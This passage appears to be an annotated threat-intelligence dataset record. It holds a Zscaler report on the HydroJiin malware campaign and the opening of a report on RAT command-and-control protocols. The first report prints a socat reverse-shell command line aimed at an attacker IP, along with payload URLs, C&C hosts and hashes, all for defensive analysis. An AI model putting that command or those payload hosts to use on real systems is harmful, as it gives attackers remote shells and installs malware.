reversed.\n![](https://lh6.googleusercontent.com/YwqPOFDb3lX9dHv3-TZj2QkYeF3kiuHqn2txAlAkblmJzrxJnNiYsA0GwQv4lYCIJGvBONK6uLAVDJi9KaazMjZ9bEgC_j4_TPJ3cNDl6VvRTNQ2KGDiyxOjNlZCPBdkxFTJG9Od)\n***Figure 2:*** *Downloading encoded payload from pastebin*\nThe downloaded malware is an injector.\nIt downloads two more payloads and passes an argument to the first payload for injection.\n![](https://lh4.googleusercontent.com/hoEcepsTdlQX-GsTHqRl7ajzoyhqcvbsig5Mfy0PdFLYEpWIQY3Z8ioWSrcfSLpn-9Dfj7yiJp2bFb3wfRZ8cL0xGvcjTCRiGH0Zs2bXEbilD8DM7cgCy7wLAqZAmrl8M2-H6hda)\n***Figure 3:*** *Passing payloads to injector*\nPayloads are then downloaded from:\n* xmr-services[.]com/C/ABAGFBBEBDBCDBFCAEGBEEBAAB\\_B\\_\\_DFECBAGGDEBEFD\\_EDCCBAEFEE.txt - Shellcode Downloader\n* pastebin[.]com/raw/G0jcGs79 - NetwiredRC\nThe payloads are also similarly string reversed after base64 encoding.\n**1.1 NetWiredRC**\nThe second payload in this case, hosted on pastebin, is a commodity malware known as NetWiredRC.\nNetWiredRC is a publicly available RAT sold by World Wired Labs, active since at least 2012.\nAdversaries often use spam mails and phishing emails to distribute NetWiredRC. In the wild, it has been seen that NetWireRC is also used by APT threat actors.\nNetwired\u2019s main focus is to gain unauthorized control on the victim machine, steal stored credentials,\u00a0and perform keylogging activity.\nThis malware has had multiple version updates with bug fixes and new functionality.\nThis sample will communicate with *beltalus.ns1[.]name:8084* for further commands.\nConfiguration extracted from Netwire RAT::\n*{'Domains': ['beltalus.ns1[.]name:8084'], 'Proxy Server': 'Not Configured', 'Password': b'Volve', 'Host ID': b'Loader-%Rand%', 'Mutex': b'mKsWHTbK', 'Install Path': b'-', 'Startup Name': b'-', 'ActiveX Key': b'-', 'KeyLog Dir': b'%AppData%\\\\Logs\\_temp\\\\', 'Proxy Option': 'Direct connection', 'Copy executable': False, 'Delete original': False, 'Lock executable': False, 'Registry autorun': False, 'ActiveX autorun': False, 'Use a mutex': True, 'Offline keylogger': True}*\n**1.2 Shellcode Downloader**\nThe first of the two downloaded payloads is a [Metasploit Shikata Ga Nai Encoder](https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html) encoded shellcode capable of downloading another payload from: *r3clama[.]com/files/chrome.exe*.\nPDB path embedded inside binary: *C:\\local0\\asf\\release\\build-2.2.14\\support\\Release\\ab.pdb*\nThe shellcode downloader downloads the following payloads:\n* *r3clama[.]com/files/socat.zip* : Socat tool\n* *r3clama[.]com/files/services.exe* : Miner Dropper\n**1.2.1 PyInstaller Payload**\nThe payload downloaded from *r3clama[.]com* is a Python-based malware bundled using pyinstaller.\nCapabilities of this payload include:\n* Persistence using Run key.\n* Download, save and extract socat.zip from *https://r3clama[.]com/files/socat.zip.*\n* Download monero miner exe from *https://r3clama[.]com/files/services.exe* which runs and further downloads QuasarRAT.\n* Start network communication thread.\n![](https://lh6.googleusercontent.com/v5w933dEe3RQBowG0liUuueDGsNnDXHsn9c1YLUotbNGl0WdyPV9Vfm2OWqepBgXBaCTS-OjxQbQUR8NnexlGmSMjG7VNcZrCtc7WOB40QGDVUGoh-6yCjDErJkDuul1pGoaHBFw)\n***Figure 4*** : Configuration settings of malware\n**Network Communication**\nThe malware next communicates with C&C server at IP '193.218.118[.]190' and port 8266, first by sending a key to the server and then waiting for .json commands.\nCommands supported by this malware include:\n* w0rm\n* url\n* upload\n![](https://lh3.googleusercontent.com/17APtSaIEgOGcvHzYXbd3lVZrDwE68CEDNnZFA20YcwMRK6XBZMUDnQfHIF8pROhTUblzJtPX1Wg2m0R8BpXfRrvX5sOKb6aEwzP5irtm3mrE5EboaVsCgnLLyBJ-q0KXy6CG2v1)\n***Figure 5 :*** Commands support by python backdoor\n**Command 'url' and 'upload'**\nBoth *url* and *upload* commands are supported only for Windows OS\u2014on any other platform these commands are ignored.\nEach of these commands is basically the same, and will download and save a payload from specified url.\nFiles are saved under a newly created directory under *%temp%* with 16-character random names.\nThere are only two differences:\n1.In the case of *upload,* the downloaded file is saved at *%temp%/upload* and in case of *url* the file is saved at *%temp%/userbin*.\n2.The *url* \u00a0command also executes the file in addition to downloading it while the *upload* command does not.\n**Command 'w0rm'**\nThe w0rm command is supported on two platforms - Windows and MacOS.\nOn receipt of this command, socat runs with following command line:\n*\"socat OPENSSL:193[.]218[.]118[.]190:4442,verify=0 EXEC:{OS Command}\"*\n**OS** **Command**\nWindows : 'cmd.exe',pipes\nMacOS : /bin/bash\nAnd sends hostname+\u2019$>\u2019 back to C&C over socket.\nIn short, this command provides a reverse shell on the system to the attacker through socat.\n**1.2.1.1** [**Socat**](http://www.dest-unreach.org/socat/)\nSocat is an advanced multipurpose data relay tool.\nIt supports a plethora of protocols.\nBelow is the description from its creators:\n\u201csocat is a relay for bidirectional data transfer between two independent data channels.\nEach of these data channels may be a file, pipe, device (serial line etc.\nor a pseudo terminal), a socket (UNIX, IP4, IP6 - raw, UDP, TCP), an SSL socket, proxy CONNECT connection, a file descriptor (stdin etc.), the GNU line editor (readline), a program, or a combination of two of these.\nThese modes include generation of \"listening\" sockets, named pipes, and pseudo terminals.\n-\u00a0 [README](http://www.dest-unreach.org/socat/doc/README)\n**1.2.1.2 Miner Dropper**\nThis is again a .Net based malware.\nIt includes a monero miner binary and all the dll dependencies required by a monero miner executable.\nIt will drop and run the miner payload.\nThen, it downloads and runs an additional payload, again from pastebin.\nHere is the Miner Dropper sequence:\nInstalls miner executable and dependency files.\n![](https://lh6.googleusercontent.com/kdEgF49O8dtEaBTmyUdhfNRuzZuffTQHcpqc3t753QsWY6_wa-YrLd7mHw78EhFbIy0IOKzPmYNZxW75whQdcEG9EUgANU-bTfaWn9MoVgv4Z-Hy3ma7O8IvUDAw0QWXq_lsG9pn)\n***Figure 6:*** *Installing xmrig miner dependency files*\nWaits for idle before starting miner.\n![](https://lh4.googleusercontent.com/PXSyq6Lz8uYha2SUbX2kU8GLzE72J_rp2Ns2e-D4nOIc6sEX-dIa3tqnSPlXL_nOIYL4EzfgpIq_RG6PDPKeMhXl3q9zveoM7FaTK9_5xLXuc_6HOLGsGVBtXNB_R374OoBNHHRQ)\n***Figure 7:*** *Checks if system is Idle before starting miner*\nCheckActive checks if the miner process is already running, if not then it is started by StartFiles.\n![](https://lh3.googleusercontent.com/VH4hxoJBaLHRlgFRGUxl20N0Nw0C6tTieGkDvnoWLa6z3Y0tXwWJoBiFQb56jrzpQBHF22J42w0YCszpcXDczoeKOSVSo6ffyPJdGBz_HAcqK2omMTgscuGskrU11619uMp2ZgVE)\n***Figure 8:*** *Running miner executable with required arguments.*\nDownloads **Quasar RAT** payload from (https://pastebin[.]com/raw/khzLqKyN) after starting miner:\n![](https://lh6.googleusercontent.com/eFf90Laj4D4e0sgXk134Y6TB2GaSWZVe2m2G_x99VuWodTUQmvG6AhxvBqqDwz4rSJg5CpuEWpyD5powOp_lXWdvQJvxlJDLvw5A2bnFhY9P8sSiT9PS7pczUD8w9SrC4xSdIgbo)\n***Figure 9:*** *Downloading another payload(QuasarRAT)*\nThis miner could be the **MinerGate Silent Miner** sold on the threat actor\u2019s malware shop.\nIf our assumption is true, there is another possibility of that miner being backdoored, similar to an old case of [Cobian RAT](/blogs/security-research/cobian-rat-backdoored-rat), piggybacking on client malware operators to distribute his own RATs.\nUnfortunately, it is not possible to assert the assumption without access to the builder.\n**1.2.1.2.1 QuasarRAT**\nQuasarRAT has been active since at least 2015.\nQuasar is an open-source project written in .Net framework and freely available to the public.\nThis means anyone can take the code and use it freely, with or without modification.\nHence, this malware has become quite popular among cyber criminals.\nIt has been used in various campaigns from mass spam campaigns to targeted attacks.\nThe sample used in this campaign was version 1.3, which has been used in a number of past campaigns.\n**Configuration of QuasarRAT**\nVersion: \"1.3.0.0\"\nC&C : \"beltalus.ns1[.]name:8082;\"\nFilename: \"Client.exe\"\nMutex: \"QSR\\_MUTEX\\_NJPXiF1GKqO6Y3uwjn\"\nThe C&C address used to control the Python backdoor and socat reverse shell is historically known to host C&C servers for many other malwares.\nHere is list of some malware and corresponding ports used to host C&C servers in the past:\n| **IP** | **Port** | **Malware** |\n| 193.218.118.190 | 8266 | Python backdoor |\n| 193.218.118.190 | 4442 | Socat listener OPENSSL |\n| 193.218.118.190 | 1111 | NjRAT |\n| 193.218.118.190 | 2407 | QuasarRAT |\n| 193.218.118.190 | 8050 | Nanocore |\n### Threat Actor HydroJiin\nWe believe this campaign is run by a threat actor known by the aliases \u2018Hydro\u2019 and \u2018JiiN\u2019.\nThe threat actor is active on forums such as hackforums[.]net since 2010 and on YouTube at least since 2007.\nInitially the actor was involved with game mods and cracks, and eventually\u00a0moved into malware space.\nWe, with high confidence, believe that this actor is from a French-speaking region.\nBy the other alias *JiiN*, the threat actor\u00a0runs a malware shop called *JiiN shop* at \u201c*xmr-services[.]com*\u201d.\nBased on the two aliases, we are calling this campaign and actor *HydroJiin.*\u00a0\nWe are attributing this campaign to *HydroJiin* with high confidence due to following reasons:\n* *JiiN shop(*Xmr-services) is used in this campaign.\n* *JiiN shop(*Xmr-services) sells malware tools which Hydro makes videos about.\n* This campaign downloads an encrypted payload from paste by user Hydro59.\nAll of the above indicates the relation between HydroJiin, this campaign, and xmr-services.\n### Malware Shop\nThe website called \u201cJiiN shop\u201d is based on the username of malware developer/seller and hosted at \u201c*xmr-services[.]com*.\nIt is used to advertise and sell different malware products.\nThe threat actor is using *https://shoppy[.]gg* for handling cryptocurrency payments.\nHe is also selling some additional stuff on shoppy.\n![](https://lh3.googleusercontent.com/Oujy2m2hxFUp2OhvrYCJhPF3NSLYjeqodSQtqWs3QDV4mB7nQ6sgBc0oVOORTa7Opelp6g4K15P7kboJZ9GeOsp_P34kX745qtuofEUjbaH2oV92JKXPNDIqFh85IVR8FjCOQiHD)\n***Figure 10:*** *JiiN Shop*\nMalware sold on this website includes:\n* **Minergate silent miner** - A configurable miner tool to mine multiple cryptocurrencies on CPU or GPU hidden from the user.\nComes with a builder with options for obfuscation, persistence, etc.\n* **Coak Crypter -** As the name implies, a packer tool to obfuscate other malware to make them undetectable.\n* **NiiJ Stealer -** A very basic stealer to steal passwords from popular tools like Firefox, Opera, Chrome, FileZilla, etc and send to the C&C panel.\n* **INK Exploit -** Claims to make malware FUD, but provides no details about the specific exploit.\nThe Campaign\n------------\nThe infection cycle\u00a0and malware payloads discussed above are just a part of an ongoing campaign.\nThe campaign has been going on since at least**September 29th, 2020**.\nThe source website for this campaign is also serving other payloads which led us to more domains and payloads.\nCovering the whole campaign is out of scope for this blog post.\nBut we are providing some details we have noticed.\nAnd a non-exhaustive list of malicious websites serving malwares, C&C domains is also included in the IoC section.\nMost of the domains as well as served file names follow a pattern.\nDomains are mostly registered using namecheap.\nDomain Pattern:\n[a-z]{4,8}\\d{2,4}[a-z]{0,2}.xyz\nE.g\npzazmrserv194[.]xyz\nmpzskdfadvert329[.]xyz\nhklkxadvert475[.]xyz\nZgkstarserver17km[.]xyz\n| **Filename pattern example** | **Malware Family** |\n| atx111.exe | SmokeLoader |\n| socks111.exe | SystemBC |\n| tau111.exe | Tauras Stealer |\n| lkx111 | Roger Ransomware |\n| lb777 | Lockbit ransomware |\n| void.exe | Downloader |\n| desk | Anydesk |\nConclusion\n----------\nThe threat actor HydroJiin has been in the malware business for some time now.\nHe is selling multiple malware types along with running his own campaigns.\nThe malware payload download stats from pastebin indicate he is having decent success.\nThis actor might not be highly advanced but he is persistent in his efforts by using various tools, techniques, and methods to increase his chances of success.\nSSL inspection is advisable to detect and block such threats using SSL to hide their malicious intent.\nWe at ZScaler ThreatLabZ continue to monitor, and strive to protect our customers from, all levels of threats.\nDetection\n---------\n**![](https://lh6.googleusercontent.com/nFpfn3wmKabhygJOgSvjqxaoKO3izxq3XwBz6ZOFLHQBL_24bHxgZ0fkyRzWjj2EJziu6uIRVIUiOWk39SuT7TXoqyP0WSQLpmaTjVsVMlwJ7Cs-aIECOQZfMNFKLKU2mPCb9ZZj)**\n***Figure 11:*** *Zscaler Cloud sandbox report flagging malware*\nIn addition to sandbox detections, the Zscaler Cloud Security Platform detects indicators at various levels:\n[Win32.Backdoor.NetWiredRC](https://threatlibrary.zscaler.com/?keyword=Win32.Backdoor.NetWiredRC)\n[Win32.Downloader.NetWiredRC](https://threatlibrary.zscaler.com/?keyword=Win32.Downloader.NetWiredRC)\n[Win32.Backdoor.QuasarRAT](https://threatlibrary.zscaler.com/?keyword=Win32.Backdoor.QuasarRAT)\n[Win32.Coinminer.Xmrig](https://threatlibrary.zscaler.com/?keyword=Win32.Coinminer.Xmrig)\n[Win32.Downloader.MiniInject](https://threatlibrary.zscaler.com/threats/52af34fd-bdb8-4653-a849-b2ee97251b88)\n[Win32.Downloader.Pyrome](https://threatlibrary.zscaler.com/threats/2ad61b60-29c1-4a10-b196-71ce43368553)\n### MITRE ATT&CK\n| **ID** | **Tactic** | **Technique** |\n| T1059 | Command and Scripting Interpreter: Windows Command Shell | Execute reverse shell commands |\n| T1555 | Credentials from Password Stores | Mentioned RAT functionality\u00a0 |\n| T1573 | Encrypted Channel: Symmetric Cryptography | Encrypt the communication between the victim and the remote machine |\n| T1105 | Ingress Tool Transfer\u00a0 | Downloads the Miner and RAT on the victim machine |\n| T1056 | Input Capture: Keylogging | Mentioned RAT functionality\u00a0 |\n| T1112 | Modify Registry | Modify Run entry in registry |\n| T1090 | Proxy | Quasar uses SOCKS5 to communicate over a reverse proxy |\n| T1021 | Remote Services: Remote Desktop Protocol | Quasar module to perform remote desktop access |\n| T1053 | Scheduled Task/Job: Scheduled Task | Establish persistence by creating new schtasks |\n| T1082 | System Information Discovery | Quasar and NETWIRE both RAT having this feature to discover and collect victim machine information.\n|\n| T1125 | Video Capture | Mentioned RAT functionality\u00a0 |\n| T1113 | Screen Capture | Mentioned RAT functionality\u00a0 |\n| T1132 | Data Encoding | Downloaded Base64 encoded file |\n| T1496 | Resource Hijacking | Install XMRig Miner on victim machine\u00a0 |\n| T1027 | Obfuscated Files or Information | XOR operation is implemented to decrypt the file |\nIOCs\n----\n| **Filename** | **Md5** | **Malware** |\n| Void.exe [ parent file] | 656951fa7b57355b58075b3c06232b01 | Win32.Downloader.MiniInject |\n| ABAGFBBEBDBCDBFCAEGBEEBAAB\\_B\\_\\_DFECBAGGDEBEFD\\_EDCCBAEFEE.txt | 9c50501b6f68921cafed8af6f6688fed | Win32.Downloader.NetWiredRC |\n| chrome.exe | 294fd63ebaae4d2e8c741003776488c2 | Win32.Downloader.Pyrome |\n| Service.exe | e9bccc96597cc96d22b85010d7fa3004 | Win32.Coinminer.Xmrig |\n| khzLqKyN | 3bb3340bccdab8cde94dd1bf105e1d3e | Win32.Backdoor.QuasarRAT |\n| G0jcGs79 | F094D8C0D9E6766BCCF78DA49AAB3CBC | Win32.Backdoor.NetWiredRC |\n| **URLs** | **Malware** |\n| gzlkmcserv437[.]xyz/void.exe | Win32.Downloader.MiniInject |\n| r3clama[.]com/files/socat.zip | Socat tool |\n| r3clama[.]com/files/services.exe | Win32.Coinminer.Xmrig |\n| pastebin[.]com/raw/khzlqkyn | Win32.Backdoor.QuasarRAT |\n| pastebin[.]com/raw/G0jcGs79 | Win32.Backdoor.NetWiredRC |\n**C&C:**\n| **C&C** | **Malware** |\n| beltalus.ns1[.]name:8084' | NetWiredRC |\n| 82.65.58[.]129 | NetWiredRC |\n| xmr.pool.minergate[.]com | XMRIG Miner |\n| beltalus.ns1[.]name:8082 | QuasarRAT |\n| 193.218.118[.]190:8266 | Pyrome backdoor |\n| 193.218.118[.]190:4442 | Socat\u00a0 |\n| 193.218.118[.]190:8266 | Python backdoor |\n| 193.218.118[.]190:4442 | Socat listener OPENSSL |\n| 193.218.118[.]190:1111 | NjRAT |\n| 193.218.118[.]190:2407 | QuasarRAT |\n| 193.218.118[.]190:8050 | Nanocore |", "mitre_ids": ["T1496", "TA0010", "TA0011", "TA0011", "T1566", "TA0003", "T1036", "S0198", "S0262", "TA0003", "T1059", "T1082", "S0338", "T1105", "T1566", "T1204", "TA0001", "T1105", "T1055", "T1055", "S0198", "TA0011", "T1041", "T1027", "T1059", "T1105", "T1105", "S0262", "T1496", "T1105", "T1105", "T1132", "T1105", "T1055", "T1105", "T1055", "T1055", "T1105", "S0198", "T1132", "S0198", "S0198", "S0198", "S0198", "S0198", "T1566", "T1566", "S0198", "TA0006", "T1056", "TA0011", "S0198", "S0332", "T1056", "T1105", "T1132", "T1105", "T1105", "T1059", "T1105", "T1059", "T1059", "TA0003", "T1547", "T1105", "S0262", "T1105", "T1105", "TA0011", "TA0011", "TA0011", "TA0011", "T1573", "T1059", "T1105", "TA0002", "TA0011", "TA0011", "TA0011", "TA0011", "T1496", "T1496", "T1496", "T1105", "T1496", "T1496", "T1496", "T1057", "T1496", "T1057", "TA0002", "TA0002", "S0262", "T1105", "T1496", "S0262", "T1105", "T1496", "T1496", "S0338", "T1496", "TA0003", "S0262", "S0262", "S0262", "T1566", "S0262", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "T1059", "TA0011", "TA0011", "TA0011", "T1059", "S0262", "S0336", "T1105", "T1496", "T1496", "T1496", "TA0003", "T1027", "TA0005", "TA0011", "T1606", "T1041", "T1211", "TA0011", "T1566", "TA0011", "S0226", "T1486", "T1105", "T1573", "T1059", "T1059", "T1555", "T1573", "T1573", "T1105", "T1105", "T1056", "T1056", "T1112", "T1112", "T1090", "S0262", "T1090", "T1090", "S0262", "T1090", "T1053", "T1053", "T1082", "S0262", "T1082", "T1125", "T1113", "T1132", "T1132", "T1496", "T1496", "T1027", "T1027", "TA0011", "TA0011", "TA0011", "TA0011", "S0198", "S0198", "S0262", "TA0003", "TA0003", "S0385", "S0262"], "anno_name_label": [["GROUP", "HydroJiin"], ["GROUP", "HydroJiin"], ["TOOL", "socat"], ["TOOL", "xmrig miner"], ["TOOL", "xmrig miner"], ["TOOL", "socat"], ["MALWARE", "MinerDropper"], ["TOOL", "socat"], ["TOOL", "socat"], ["TOOL", "socat"], ["TOOL", "socat"], ["TOOL", "socat"], ["TOOL", "socat"], ["TOOL", "socat"], ["TOOL", "socat"], ["MALWARE", "MinerDropper"], ["MALWARE", "MinerDropper"], ["TOOL", "xmrig miner"], ["TOOL", "socat"], ["TOOL", "socat"], ["GROUP", "HydroJiin"], ["GROUP", "HydroJiin"], ["GROUP", "HydroJiin"], ["GROUP", "HydroJiin"], ["GROUP", "HydroJiin"], ["GROUP", "HydroJiin"], ["GROUP", "HydroJiin"], ["GROUP", "HydroJiin"], ["GROUP", "HydroJiin"], ["GROUP", "HydroJiin"], ["GROUP", "HydroJiin"], ["GROUP", "HydroJiin"], ["GROUP", "HydroJiin"], ["TOOL", "Coak Crypter"], ["TOOL", "NiiJ Stealer"], ["GROUP", "HydroJiin"], ["TOOL", "xmrig miner"], ["TOOL", "socat"], ["TOOL", "socat"], ["TOOL", "socat"]], "cti_entity_class": ["CE", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE"]}, {"cti_report": "Catching RATs Over Custom Protocols\nMay 05, 2021\nAdversaries generally use Standard Application Layer Protocols for communication between malware and command and control (C&C) servers.\nThis is for several reasons: first, malicious traffic blends in more easily with legitimate traffic on standard protocols like HTTP/S; second, companies that rely on appliances for security often don\u2019t inspect all SSL/TLS encrypted traffic as it is extremely resource-intensive to do so.\nHowever, the massive growth of SSL attacks \u2013\u00a0[260% higher in 2020 compared to 2019](/blogs/security-research/2020-state-encrypted-attacks)\u00a0\u2013 has turned many security teams\u2019 attention to these encrypted channels.\nFor those that do inspect their encrypted traffic, modern network security proxies, gateways, and firewalls are evolved enough to conveniently parse application protocols and strip the SSL layer to scan the underlying data.\nAnd by knowing the protocol, scan engines using heuristics or machine-learning techniques can more easily differentiate between malicious and legitimate traffic, giving security teams an advantage.\nThese trends have led some adversaries to turn to custom protocols.\nAlthough custom protocols for malicious communication are nothing new,\u00a0almost one-third of prevalent malware families we recently analyzed support communication over non-HTTP/S protocols.\nAlmost all of these malware families are Remote Access Trojans (RATs) and are found all over, from campaigns of mass infection to highly targeted attacks.\nIn this article, we dissect the custom protocols used in some of the most prevalent RATs seen in recent campaigns.\nAt the end, we share a number of signatures and Snort rules that aid in detecting these attacks.\nBelow are statistical representations of traffic that Zscaler blocked for non-HTTP/S\u00a0C&C communication, as well as the most active RAT families that we observed over a three-month period.\n![](https://lh5.googleusercontent.com/aYzD50PDgdfzxXZyjeGnZ1rFbL-b7dYT3UQCAZqIIgf8MAI3Adj4MziWl0n-AuYx6tISUTHpur-YwI9J7Z2s7gKMRX_eLqMUMoDEdQ1NcJYgiHUZNj6taGB_E-S9p0XZ7MhBSPR1)\n*Fig.1: Hits of top threats communicating over non-HTTP/S\u00a0in the last quarter.*\n*![](https://lh5.googleusercontent.com/PriwwYlpzpsb-E89vgyjWguBklqQvrw8j4DN9ttZ_LaIShbiWvvvyVjUw-MgUxV6X-JU_DTOWtl5VGU06GqCY83AsXDuBJee6_cx0egzqKtIVxD7TnkT1-z_frrKimsVbb7Z9ApG)*\n*Fig.2: Hits of top non-HTTP/S\u00a0based RAT families in last quarter.*\n### **Remcos RAT**\nRemcos is\u00a0remote access and surveillance software developed and distributed by an organization called Breaking Security.\nThe Remcos RAT appeared in hacking forums in late 2016.\nSince then, it has been favored by many cyber criminals and even adopted by APT actors such as the [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [Elfin Group](https://attack.mitre.org/groups/G0064/).\nRemcos is primarily delivered to victims via malicious attachments in phishing emails.\nIts capabilities range from logging keystrokes to executing commands, stealing credentials, and capturing microphones and webcams.\nRC4 key and encrypted configuration data is kept in the resource section \u201cSETTINGS\u201d under \u201cRCData\u201d.\nThe configuration contains the C&C address, port, mutex name, and encryption key for C&C communication.\n![](https://lh6.googleusercontent.com/zN7waqVzJ7bcYrfOAkgqH-_czg5hvNth-DIU6ll956XT3r7e49_4CLHbjXWxlnc7D4fCrNd_UIXEW3hKz8K4Wt7lGVLzCuIsbBTcUhFu4JP0n4f4zFXterYWG-HxAva4QI_S5gIo)\n*Fig.3: Encrypted configuration in resource.*\n![](https://lh5.googleusercontent.com/vd-LhD9lYGPqT3Yl_ABwdyq2A0yN5YasLtqsvF_hSua6QkxIMi9MZ0zgtZfpRDpSgUfZmxbCKOcB4G9mUh7VY5uSDjYzUwHl8wjZzk102ApFqJeabOokBoYv0Z3nSZ2b2pOTZZ3d)\n*Fig.4: Decrypted configuration*\nRemcos communicates over non-HTTP/S\u00a0channels/ports on custom protocols.\nThe bot can be configured to communicate in plain text, which makes it fairly straightforward to detect\u00a0C&C traffic.\nThe custom protocol contains the header \u201c[DataStart]\u201d followed by the size of data and then followed by the exfiltrated data.\n![](https://lh5.googleusercontent.com/7wLs8lUEMdYFPShrSwZR0DS-dWkSEznyb1LzuiirRBrwkx_aOfRHBBA9IZi6M3wA_tZ8wmTxQ-nVQQRAXBqHX1bUn9QziriO_-34JLECbcWR-OTBtiG6WhFF2EQQxOYd8qQz_vnB)\n*Fig.5: Data sent to C&C server in plain text.*\nHowever, in most cases, the communication is encrypted using the RC4 algorithm with a key present in the configuration.\nIt is not possible to match signatures in encrypted binary data.\nHowever, there is scope for heuristics-based detection.\nUpon execution, Remcos sends system information to its C&C server, and in return the server replies with commands to execute.\nAs this request and response is encrypted with the same symmetric key, the header \u201c[DataStart]\u201d will generate the same encrypted stream of bytes in place of the header for all communication generated by the executable.\n![](https://lh5.googleusercontent.com/ueaF5gjccOqVQVXS2sRGsLoQin-mq3xSkD-SwxC7XZRlQLqmidAWsItAJKXAALu_LIsYjNqovbDiRsM3DRRqSg6lvtdZ9s4SvOJuxehAqyQA6pj0uhLjIdNuwNvOZlUXBinfRIsI)\n*Fig.6: Data sent to C&C server as RC4 encrypted.*\nAs an example, it can be seen in the above image, a binary stream of bytes \u201c08 b4 de f6 84 27 70 9a 57 17 5e\u201d has taken place of the header \u201c[DataStart]\u201d.\nThe repeated stream pattern of 11 bytes in requests and responses\u2014plus a combination of other heuristics such as entropy and data length limits\u2014can be considered for flagging RC4 encrypted Remcos traffic.\n### **Crimson RAT**\nCrimson RAT has been favored by threat actors for targeted attacks on governments and organizations in the financial, healthcare, and space technology sectors.\nIn 2016, it was found to be used in targeted attacks against Indian diplomatic and military resources.\nLast year, we found it [targeting Indian financial institutions](/blogs/security-research/targeted-attack-indian-financial-institution-delivers-crimson-rat).\nCrimson is typically delivered to the victim via a phishing email containing a malicious .doc file or link to a malicious executable.\n![](https://lh3.googleusercontent.com/c7KKJMQxQbwMWpqvZ_pJkOGJ6PmWkAp4tsVV3p2Bz3q0URqeSGgeSN9pxCx23208FoGOV4FeHCC6KDY3foKhvH9u1izFykL4QfoUi2Hxgs4rA_Wgtnzh6arhGnzXhGB3hG65-euh)\n*Fig.7: Data sent to C&C server*\n### **NetWire RAT**\nThe NetWire RAT is a malicious tool that emerged almost a decade ago and has been updated many times since then.\nNetWire has been detected in various campaigns such as\u00a0[Hydrojiin](/blogs/security-research/look-hydrojiin-campaign) and advanced persistent threat (APT) attacks including\u00a0[SilverTerrier](https://attack.mitre.org/groups/G0083/) and [The White Company](https://attack.mitre.org/groups/G0089/).\nTypically, the NetWire RAT is downloaded as a second-stage payload to systems that have been compromised using other malware such as GuLoader.\nAlso, it was found to be delivered via [exploit kits](/blogs/security-research/sundown-chronicles-observations-exploit-kits-evolution).\nNetWire communicates with custom protocols over TCP and communication is encrypted with AES encryption.\nEach packet begins with a length of data followed by one byte for the command and then followed by data.\nThe initial packet sends a 32-byte seed value along with 16-byte IV value and hardcoded password specified in the binary to generate the AES key.\nThe C&C server generates a session key for this information.\n![](https://lh4.googleusercontent.com/usA4f2R1PIROH6JL8hvC6FHrb_GuwbBcM3LO2F6hudKGMeEyRfB3Waea5wyfE3nSlk6MyqzXj0SE6t05M4etgOhBwOGYJ_pa2Akv4hN8S34D4S3CRVALYkQwBGqdRCThxlk9ZHrk)\n*Fig.8: Data sent to C&C server as AES encrypted.*\nAs the communication is AES encrypted, it is not possible to scan for signature patterns in communication.\nHowever, there is enough information in the initial packet to flag the traffic as NetWire C&C communication.\n### **AsyncRAT**\nAsyncRAT is an open-source RAT designed to remotely monitor and control other computers through a secure encrypted connection.\nAsyncRAT provides functionality such as keylogger, screen viewer, command execution, and many more.\nBecause of its feature of secure communication, AsyncRAT is used for malicious motives by cybercriminals and weaponized in APT campaigns such as \"[Operation Spalax](https://www.welivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombia/).\nAsyncRAT has been found to be delivered via various methods such as spear-phishing, malvertising, and exploit kits.\nAsyncRAT communicates over secure TCP channels.\nAs the custom certificate is carried in the binary itself and matched against the C&C certificate, it is not possible to strip the TLS layer at the proxy/gateway level.\nHowever, such custom certificates can be filtered out and communication can be blocked by other preventing controls.\n![](https://lh6.googleusercontent.com/BNgh3pB-hE3i75fI2LSr9VK7ePZZBZCsiph1M5US6SA0Bbpxa16uuoyrATQTg3bxHjUbU7Ioe65psbtZBq0_Wt9JzweADaAdhdmck0S9UAt6ildONREL6uTwxoyARwUHLznCo48P)\n*Fig.9: Server certificate having subject and issuer name as \u201cAsyncRAT Server\u201d*\n#### **Quasar RAT**\nQuasar is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors including \u201c[Gorgon Group](https://attack.mitre.org/groups/G0078/)\u201d and\u00a0\u201c[Patchwork](https://attack.mitre.org/groups/G0040/).\nIts features include\u00a0remote desktop, keylogging, password stealing, and many more.\nQuasar encrypts communications using an AES algorithm with a pre-shared key hardcoded in the client binary.\nIt is not possible to scan for signature patterns on AES-encrypted traffic.\nHowever, the distinctive characteristics of encrypted data packets can be leveraged to flag Quasar's AES encrypted 